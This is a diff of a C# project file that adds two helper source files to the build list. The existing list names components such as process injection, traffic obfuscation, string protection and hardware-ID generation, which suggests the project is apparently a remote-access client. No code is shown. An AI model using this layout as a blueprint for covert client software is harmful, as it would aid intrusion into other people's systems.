@@ -119,6 +119,7 @@
     <Compile Include="Helper\CertificatePinning.cs" />
     <Compile Include="Helper\ClientSocket.cs" />
     <Compile Include="Helper\CompressionHelper.cs" />
+    <Compile Include="Helper\ErrorHandler.cs" />
     <Compile Include="Helper\HwidGen.cs" />
     <Compile Include="Helper\IdSender.cs" />
     <Compile Include="Helper\Logger.cs" />
@@ -130,6 +131,7 @@
     <Compile Include="Helper\PluginManager.cs" />
     <Compile Include="Helper\ProcessCritical.cs" />
     <Compile Include="Helper\ProcessInjection.cs" />
+    <Compile Include="Helper\SecureKeyDerivation.cs" />
     <Compile Include="Helper\SetRegistry.cs" />
     <Compile Include="Helper\StringProtection.cs" />
     <Compile Include="Helper\TrafficObfuscator.cs" />
